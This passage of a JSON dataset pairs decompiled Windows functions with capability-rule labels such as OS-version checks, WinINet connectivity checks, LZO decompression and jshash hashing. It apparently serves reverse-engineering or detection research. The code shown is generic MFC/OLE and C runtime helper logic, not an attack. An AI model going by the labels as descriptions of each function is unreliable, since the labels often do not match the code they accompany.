            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0043354d(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t hWnd;\n    \n    iVar2 = *(param_1 + 100);\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + 0x1c);\n    }\n    hWnd = param_1;\n    uVar1 = fcn.0042febc(iVar2, &hWnd);\n    *(param_1 + 0x7c) = uVar1;\n    fcn.0042c1a4(param_1);\n    iVar2 = sub.oledlg.dll_OleUIBusyA(param_1 + 0x74);\n    fcn.0042af59();\n    fcn.0042af2b();\n    if (hWnd != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(hWnd, 1);\n    }\n    uVar1 = 2;\n    if (iVar2 != 2) {\n        if (iVar2 == 0x75) {\n            *(param_1 + 0xa0) = 1;\n        }\n        else {\n            if (iVar2 != 0x76) {\n                if (iVar2 == 0x77) {\n                    *(param_1 + 0xa0) = 3;\n                    return 1;\n                }\n                uVar1 = fcn.004334b4(iVar2);\n            }\n            *(param_1 + 0xa0) = uVar1;\n        }\n        return 1;\n    }\n    return 2;\n}\n",
        "token_count": 351
    },
    "004335f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004335f9(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CEnumArray.0;\n    pcVar1 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 0;\n    if (pcVar1 != NULL) {\n        fcn.004332a4();\n    }\n    if (extraout_ECX[0xc] != NULL) {\n        fcn.00428fdc(extraout_ECX[9]);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00428b21();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 244
    },
    "00433cc4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00433cc4(uint32_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    int16_t *piVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    uint uVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int16_t iVar9;\n    uint32_t in_ECX;\n    int16_t *piVar10;\n    ulong *puVar11;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = in_ECX;\n    puVar11 = arg_8h + 1;\n    if ((arg_14h == 6) || (arg_14h == 0xc)) {\n        *puVar11 = arg_10h;\n        puVar11 = arg_8h + 2;\n    }\n    iVar3 = *arg_18h;\n    bVar4 = false;\n    arg_14h = arg_18h[2];\n    var_4h = arg_18h[3];\n    uVar2 = *arg_ch;\n    do {\n        if (uVar2 == 0) {\ncode_r0x00433e9b:\n            if (arg_14h < 1) {\n                if (*arg_ch == 0) {\n                    iVar8 = 0;\n                }\n                else {\n                    *arg_1ch = arg_18h[2];\n                    iVar8 = -0x7ffdfff1;\n                }\n            }\n            else {\n                iVar8 = -0x7ffdfff2;\ncode_r0x00433ea6:\n                *arg_1ch = arg_14h;\n            }\n            return iVar8;\n        }\n        uVar2 = *arg_ch;\n        arg_8h = in_ECX & 0xffff0000 | uVar2;\n        arg_14h = arg_14h + -1;\n        if ((uVar2 != 0xff) && ((uVar2 & 0x40) != 0)) {\n            arg_8h = uVar2 & 0xffbf | 0x4000;\n        }\n        iVar9 = arg_8h;\n        if (arg_14h < var_4h) {\n            if (iVar9 == 0xff) {\n                arg_14h = arg_18h[3];\n                var_4h = 0;\n                bVar4 = true;\n                goto code_r0x00433e8b;\n            }\n            if ((!bVar4) && (iVar9 == 0xc)) {\n                *0x4495c8 = 10;\n                *0x4495d0 = 0x80020004;\n                piVar10 = 0x4495c8;\n                goto code_r0x00433e2e;\n            }\n            goto code_r0x00433e9b;\n        }\n        if (iVar9 == 0xff) goto code_r0x00433e9b;\n        piVar1 = arg_14h * 0x10 + iVar3;\n        piVar10 = piVar1;\n        if ((iVar9 != 0xc) && (iVar9 != *piVar1)) {\n            piVar10 = arg_20h + arg_14h * 0x10;\n            arg_10h = 8;\n            if (iVar9 != 0xe) {\n                arg_10h = arg_8h;\n            }\n            if ((*piVar1 != arg_10h) &&\n               (iVar8 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(piVar10, piVar1, 0, arg_10h),  iVar8 < 0))\n            goto code_r0x00433ea6;\n            if (iVar9 == 0xe) {\n                if (*piVar1 == arg_10h) {\n                    uVar6 = fcn.00432365();\n                    *(piVar10 + 4) = uVar6;\n                    *piVar10 = 8;\n                }\n                else {\n                    uVar6 = *(piVar10 + 4);\n                    uVar5 = fcn.00432365(uVar6);\n                    *(piVar10 + 4) = uVar5;\n                    (*_sym.imp.OLEAUT32.dll_SysStringLen)(uVar6);\n                }\n                arg_8h = 0x8;\n            }\n        }\ncode_r0x00433e2e:\n        if ((arg_8h & 0x4000) != 0) {\ncode_r0x00433e83:\n            uVar7 = *(piVar10 + 4);\n            goto code_r0x00433e86;\n        }\n    // switch table (20 cases) at 0x433ecd\n        switch(arg_8h & 0xffff) {\n        case 2:\n            uVar7 = piVar10[4];\n            break;\n        case 3:\n        case 4:\n        case 8:\n        case 9:\n        case 10:\n        case 0xd:\n        case 0x13:\n            goto code_r0x00433e83;\n        case 5:\n        case 7:\n            *puVar11 = *(piVar10 + 4);\n            goto code_r0x00433e68;\n        case 6:\n        case 0x14:\n        case 0x15:\n            *puVar11 = *(piVar10 + 4);\n            *(puVar11 + 4) = *(piVar10 + 6);\ncode_r0x00433e68:\n            puVar11 = puVar11 + 1;\n            goto code_r0x00433e8b;\n        case 0xb:\n            uVar7 = piVar10[4] != 0;\n            break;\n        case 0xc:\n            *puVar11 = piVar10;\n            goto code_r0x00433e88;\n        default:\n            goto code_r0x00433e8b;\n        case 0x10:\n            uVar7 = *(piVar10 + 4);\n            break;\n        case 0x11:\n            uVar7 = *(piVar10 + 4);\n            break;\n        case 0x12:\n            uVar7 = piVar10[4];\n        }\ncode_r0x00433e86:\n        *puVar11 = uVar7;\ncode_r0x00433e88:\n        puVar11 = puVar11 + 4;\ncode_r0x00433e8b:\n        arg_ch = arg_ch + 1;\n        uVar2 = *arg_ch;\n        in_ECX = arg_8h;\n    } while( true );\n}\n",
        "token_count": 1526
    },
    "004344c1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.004344c1(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.004281c9();\n    *extraout_ECX = vtable.COleDispatchException.0;\n    fcn.00401400();\n    *(unaff_EBP + -4) = 0;\n    fcn.00401400();\n    fcn.00401400();\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar3 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 2;\n    extraout_ECX[4] = -(*(unaff_EBP + 0xc) != 0) & *(unaff_EBP + 0xc) + 0x60000U;\n    *(extraout_ECX + 2) = iVar1;\n    if (iVar3 != 0) {\n        fcn.00401a60(*(unaff_EBP + 8));\n    }\n    uVar2 = *(unaff_EBP + -0xc);\n    extraout_ECX[7] = (-(iVar1 != 0) & 0x7fff0001) + 0x8000ffff;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 425
    },
    "00434560": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434560(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = *param_1;\n    if (piVar1 != NULL) {\n        if (param_1[1] != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        *param_1 = NULL;\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "00434b70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434b70(int32_t param_1)\n\n{\n    if (*(param_1 + 0x46) != '\\0') {\n        if (*(param_1 + 0x20) != 0) {\n            (*_sym.imp.ole32.dll_CoRevokeClassObject)(*(param_1 + 0x20));\n            *(param_1 + 0x20) = 0;\n        }\n        *(param_1 + 0x46) = 0;\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00434bbb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434bbb(int32_t param_1)\n\n{\n    if (*(param_1 + 0x1c) != 0) {\n        (*_sym.imp.ole32.dll_CoRegisterMessageFilter)(0, 0);\n        *(param_1 + 0x1c) = 0;\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0041d36d": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041d36d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43ae58, 0x14);\n    *(unaff_EBP + -0x20) = 0xffffffff;\n    fcn.0041f23f(0xd);\n    *(unaff_EBP + -4) = 0;\n    *0x449688 = 0;\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 == -2) {\n        *0x449688 = 1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)();\n    }\n    else if (iVar1 == -3) {\n        *0x449688 = 1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetACP)();\n    }\n    else if (iVar1 == -4) {\n        *0x449688 = 1;\n        iVar1 = *0x449978;\n    }\n    *(unaff_EBP + 8) = iVar1;\n    arg_8h_00 = *0x44acc8;\n    if (iVar1 == *0x44ade4) {\n        *(unaff_EBP + -0x20) = 0;\n    }\n    else {\n        *(unaff_EBP + -0x24) = *0x44acc8;\n        if ((arg_8h_00 == NULL) || (*arg_8h_00 != 0)) {\n            arg_8h_00 = fcn.0041ba5b(0x220);\n            *(unaff_EBP + -0x24) = arg_8h_00;\n        }\n        if (arg_8h_00 != NULL) {\n            iVar1 = fcn.0041d1dd(*(unaff_EBP + 8));\n            *(unaff_EBP + -0x20) = iVar1;\n            if (iVar1 == 0) {\n                *arg_8h_00 = 0;\n                arg_8h_00[1] = *0x44ade4;\n                arg_8h_00[2] = *0x44accc;\n                arg_8h_00[3] = *0x44acc4;\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  iVar1 < 5; iVar1 = iVar1 + 1) {\n                    *(arg_8h_00 + iVar1 * 2 + 0x10) = *(iVar1 * 2 + 0x44adf0);\n                }\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  iVar1 < 0x101; iVar1 = iVar1 + 1) {\n                    *(iVar1 + 0x1c + arg_8h_00) = *(iVar1 + 0x44ace0);\n                }\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  *0x44acc8 = arg_8h_00,  iVar1 < 0x100; iVar1 = iVar1 + 1)\n                {\n                    *(iVar1 + 0x11d + arg_8h_00) = *(iVar1 + 0x44ae00);\n                }\n            }\n        }\n        if ((*(unaff_EBP + -0x20) == -1) && (arg_8h_00 != *0x44acc8)) {\n            fcn.0041ba6d(arg_8h_00);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041d4b4();\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 912
    },
    "00401210": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401210(uint *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t **ppiVar6;\n    int32_t *unaff_EBP;\n    uint *puVar7;\n    \n    param_1 = *param_1;\n    ppiVar6 = param_1 + -4;\n    iVar2 = param_1[-3];\n    puVar3 = (**(**ppiVar6 + 0x10))();\n    iVar4 = (***puVar3)(param_2, 1);\n    if (iVar4 == 0) {\n        iVar4 = fcn.00401200();\n    }\n    if (iVar2 < param_2) {\n        param_2 = iVar2;\n    }\n    puVar7 = iVar4 + 0x10;\n    puVar3 = param_1;\n    for (uVar5 = param_2 + 1U >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar7 = *puVar3;\n        puVar7 = puVar7 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    for (uVar5 = param_2 + 1U & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar7 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    *(iVar4 + 4) = iVar2;\n    piVar1 = param_1 + -1;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar6 + 4))(ppiVar6);\n    }\n    *unaff_EBP = iVar4 + 0x10;\n    return;\n}\n",
        "token_count": 475
    },
    "004013a0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nulong fcn.004013a0(int32_t **param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t **ppiVar6;\n    int32_t **ppiVar7;\n    ulong uVar8;\n    \n    piVar2 = (**(**param_1 + 0x10))();\n    ppiVar6 = param_1 + 3;\n    if ((-1 < param_1[3]) && (piVar2 == *param_1)) {\n        LOCK();\n        piVar2 = *ppiVar6;\n        *ppiVar6 = *ppiVar6 + 1;\n        return CONCAT44(piVar2, param_1);\n    }\n    iVar3 = (***piVar2)(param_1[1], 1);\n    if (iVar3 == 0) {\n        fcn.004010f0(0x8007000e);\n        pcVar1 = swi(3);\n        uVar8 = (*pcVar1)();\n        return uVar8;\n    }\n    *(iVar3 + 4) = param_1[1];\n    uVar4 = param_1[1] + 1;\n    ppiVar6 = param_1 + 4;\n    ppiVar7 = iVar3 + 0x10;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *ppiVar7 = *ppiVar6;\n        ppiVar6 = ppiVar6 + 1;\n        ppiVar7 = ppiVar7 + 1;\n    }\n    for (uVar5 = uVar4 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *ppiVar7 = *ppiVar6;\n        ppiVar6 = ppiVar6 + 1;\n        ppiVar7 = ppiVar7 + 1;\n    }\n    return CONCAT44(uVar4, iVar3);\n}\n",
        "token_count": 467
    },
    "00401560": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401560(int32_t *param_1, uint *param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *extraout_EDX;\n    uint32_t unaff_ESI;\n    uint32_t uVar3;\n    uint32_t unaff_EDI;\n    uint *arg_8h;\n    uint *unaff_retaddr;\n    uint32_t in_stack_ffffffec;\n    \n    if (param_3 == 0) {\n        fcn.004012e0();\n        return;\n    }\n    if (param_2 != NULL) goto code_r0x00401588;\n    do {\n        fcn.004010f0();\n        param_2 = extraout_EDX;\ncode_r0x00401588:\n        iVar1 = *param_1;\n        uVar3 = param_2 - iVar1;\n        uVar2 = *(iVar1 + -0xc);\n        if ((1U - *(iVar1 + -4) | *(iVar1 + -8) - param_3) < 0) {\n            param_2 = unaff_retaddr;\n            in_stack_ffffffec = param_3;\n            fcn.00401350(param_3, unaff_EDI, unaff_ESI);\n            unaff_retaddr = param_2;\n        }\n        unaff_ESI = unaff_EDI;\n        unaff_EDI = in_stack_ffffffec;\n        arg_8h = *param_1;\n        if (uVar2 < uVar3) {\n            for (uVar2 = param_3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *arg_8h = *param_2;\n                param_2 = param_2 + 1;\n                arg_8h = arg_8h + 1;\n            }\n            for (uVar2 = param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *arg_8h = *param_2;\n                param_2 = param_2 + 1;\n                arg_8h = arg_8h + 1;\n            }\n        }\n        else {\n            fcn.0041b0f0(arg_8h, arg_8h + uVar3, param_3);\n        }\n        in_stack_ffffffec = unaff_EDI;\n    } while ((param_3 < 0) || (*(*param_1 + -8) < param_3));\n    *(*param_1 + -0xc) = param_3;\n    *(param_3 + *param_1) = 0;\n    return;\n}\n",
        "token_count": 600
    },
    "00401600": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00401600(char **param_1, uint *param_2, char *param_3)\n\n{\n    char cVar1;\n    char **ppcVar2;\n    code *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char **ppcVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    uint32_t unaff_EBX;\n    char **ppcVar10;\n    int32_t iVar11;\n    char *pcVar12;\n    uint *puVar13;\n    uint *puVar14;\n    char **ppcVar15;\n    uint *puVar16;\n    uint unaff_retaddr;\n    uint32_t uVar17;\n    int32_t iStack32;\n    int32_t iStack16;\n    char **ppcStack8;\n    \n    iVar11 = 0;\n    if (param_2 != NULL) {\n        puVar14 = param_2;\n        do {\n            cVar1 = *puVar14;\n            puVar14 = puVar14 + 1;\n        } while (cVar1 != '\\0');\n        ppcVar15 = puVar14 - (param_2 + 1);\n        if (ppcVar15 != NULL) {\n            if (param_3 == NULL) {\n                iStack32 = 0;\n            }\n            else {\n                pcVar12 = param_3 + 1;\n                do {\n                    cVar1 = *param_3;\n                    param_3 = param_3 + 1;\n                } while (cVar1 != '\\0');\n                iStack32 = param_3 - pcVar12;\n            }\n            pcVar12 = *param_1;\n            pcVar4 = pcVar12 + *(pcVar12 + -0xc);\n            if (pcVar12 < pcVar4) {\n                do {\n                    iVar5 = fcn.0041af1f(pcVar12, param_2);\n                    while (iVar5 != 0) {\n                        pcVar12 = iVar5 + ppcVar15;\n                        iVar11 = iVar11 + 1;\n                        iVar5 = fcn.0041af1f(pcVar12, param_2);\n                    }\n                    if (pcVar12 == NULL) {\n                        iVar5 = 0;\n                    }\n                    else {\n                        pcVar6 = pcVar12;\n                        do {\n                            cVar1 = *pcVar6;\n                            pcVar6 = pcVar6 + 1;\n                        } while (cVar1 != '\\0');\n                        iVar5 = pcVar6 - (pcVar12 + 1);\n                    }\n                    pcVar12 = pcVar12 + iVar5 + 1;\n                } while (pcVar12 < pcVar4);\n                if (0 < iVar11) {\n                    pcVar12 = *param_1;\n                    ppcVar2 = *(pcVar12 + -0xc);\n                    ppcVar10 = (iStack32 - ppcVar15) * iVar11 + ppcVar2;\n                    ppcVar7 = ppcVar2;\n                    if (ppcVar2 < ppcVar10) {\n                        ppcVar7 = ppcVar10;\n                    }\n                    if ((1U - *(pcVar12 + -4) | *(pcVar12 + -8) - ppcVar7) < 0) {\n                        fcn.00401350(ppcVar7);\n                    }\n                    pcVar4 = *ppcVar2;\n                    pcVar6 = pcVar4 + iStack32;\n                    for (pcVar12 = pcVar4; pcVar12 < pcVar6; pcVar12 = pcVar12 + iVar11 + 1) {\n                        puVar14 = fcn.0041af1f(pcVar12, unaff_retaddr);\n                        while (puVar14 != NULL) {\n                            uVar17 = unaff_EBX;\n                            fcn.0041b0f0(puVar14 + unaff_EBX, puVar14 + ppcVar15, \n                                         pcVar4 + iStack32 + (-ppcVar15 - puVar14));\n                            puVar13 = param_2;\n                            puVar16 = puVar14;\n                            for (uVar9 = unaff_EBX >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {\n                                *puVar16 = *puVar13;\n                                puVar13 = puVar13 + 1;\n                                puVar16 = puVar16 + 1;\n                            }\n                            for (uVar9 = unaff_EBX & 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n                                *puVar16 = *puVar13;\n                                puVar13 = puVar13 + 1;\n                                puVar16 = puVar16 + 1;\n                            }\n                            *(puVar14 + pcVar4 + iStack32 + (-ppcVar15 - puVar14) + unaff_EBX) = '\\0';\n                            pcVar12 = puVar14 + unaff_EBX;\n                            iStack32 = iStack32 + (unaff_EBX - param_1);\n                            puVar14 = fcn.0041af1f(pcVar12, unaff_retaddr);\n                            ppcVar15 = param_1;\n                            unaff_EBX = uVar17;\n                        }\n                        if (pcVar12 == NULL) {\n                            iVar11 = 0;\n                        }\n                        else {\n                            pcVar8 = pcVar12;\n                            do {\n                                cVar1 = *pcVar8;\n                                pcVar8 = pcVar8 + 1;\n                            } while (cVar1 != '\\0');\n                            iVar11 = pcVar8 - (pcVar12 + 1);\n                        }\n                        ppcVar10 = ppcStack8;\n                    }\n                    if ((ppcVar10 < 0) || (*(*ppcVar2 + -8) < ppcVar10)) {\n                        fcn.004010f0(0x80070057);\n                        pcVar3 = swi(3);\n                        iVar11 = (*pcVar3)();\n                        return iVar11;\n                    }\n                    *(*ppcVar2 + -0xc) = ppcVar10;\n                    *(ppcVar10 + *ppcVar2) = '\\0';\n                    iVar11 = iStack16;\n                }\n            }\n            return iVar11;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1398
    },
    "00401860": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid fcn.00401860(int32_t **param_1, int32_t param_2, uint *param_3, uint32_t param_4, int32_t param_5)\n\n{\n    uchar *puVar1;\n    int32_t **ppiVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t **ppiVar5;\n    int32_t **ppiVar6;\n    uint *puVar7;\n    \n    puVar1 = param_3 + param_5;\n    if ((1U - (*param_1)[-1] | (*param_1)[-2] - puVar1) < 0) {\n        fcn.00401350(puVar1);\n    }\n    ppiVar2 = *param_1;\n    ppiVar5 = param_1;\n    ppiVar6 = ppiVar2;\n    for (uVar4 = param_3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *ppiVar6 = *ppiVar5;\n        ppiVar5 = ppiVar5 + 1;\n        ppiVar6 = ppiVar6 + 1;\n    }\n    for (uVar4 = param_3 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *ppiVar6 = *ppiVar5;\n        ppiVar5 = ppiVar5 + 1;\n        ppiVar6 = ppiVar6 + 1;\n    }\n    puVar7 = ppiVar2 + param_2;\n    for (uVar4 = param_4 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar7 = *param_3;\n        param_3 = param_3 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (param_4 = param_4 & 3; param_4 != 0; param_4 = param_4 - 1) {\n        *puVar7 = *param_3;\n        param_3 = param_3 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    if ((-1 < puVar1) && (puVar1 <= (*param_1)[-2])) {\n        (*param_1)[-3] = puVar1;\n        puVar1[*param_1] = 0;\n        return;\n    }\n    fcn.004010f0(0x80070057);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 583
    },
    "004018f0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004018f0(int32_t *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t unaff_EBX;\n    uint *puVar4;\n    uint *unaff_retaddr;\n    \n    iVar1 = *param_1;\n    uVar3 = *(iVar1 + -0xc);\n    param_3 = uVar3 + param_3;\n    if ((1U - *(iVar1 + -4) | *(iVar1 + -8) - param_3) < 0) {\n        fcn.00401350(param_3);\n    }\n    if (param_2 - iVar1 <= uVar3) {\n        unaff_retaddr = *param_1 + (param_2 - iVar1);\n    }\n    puVar4 = *param_1 + unaff_EBX;\n    for (uVar3 = param_2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar4 = *unaff_retaddr;\n        unaff_retaddr = unaff_retaddr + 1;\n        puVar4 = puVar4 + 1;\n    }\n    for (param_2 = param_2 & 3; param_2 != 0; param_2 = param_2 - 1) {\n        *puVar4 = *unaff_retaddr;\n        unaff_retaddr = unaff_retaddr + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if ((-1 < param_3) && (param_3 <= *(*param_1 + -8))) {\n        *(*param_1 + -0xc) = param_3;\n        *(param_3 + *param_1) = 0;\n        return;\n    }\n    fcn.004010f0(0x80070057);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 453
    },
    "004103f0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004103f0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint32_t var_8h;\n    uint32_t var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4358f0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    uVar4 = var_8h | 0xf;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = *(in_ECX + 0x18);\n        uVar3 = uVar1 >> 1;\n        var_8h = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar1 <= -uVar3 - 2)) {\n            var_8h = uVar3 + uVar1;\n        }\n    }\n    var_4h = 0;\n    puVar2 = fcn.00428fb1(var_8h + 1);\n    if (var_ch != 0) {\n        if (*(in_ECX + 0x18) < 0x10) {\n            puVar5 = in_ECX + 4;\n        }\n        else {\n            puVar5 = *(in_ECX + 4);\n        }\n        puVar6 = puVar2;\n        for (uVar4 = var_ch >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n        for (uVar4 = var_ch & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    if (0xf < *(in_ECX + 0x18)) {\n        fcn.00428fdc(*(in_ECX + 4));\n    }\n    puVar5 = in_ECX + 4;\n    *puVar5 = 0;\n    *puVar5 = puVar2;\n    *(in_ECX + 0x18) = var_8h;\n    *(in_ECX + 0x14) = var_ch;\n    if (0xf < var_8h) {\n        puVar5 = puVar2;\n    }\n    *(puVar5 + var_ch) = 0;\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 718
    },
    "00410770": {
        "rules": [
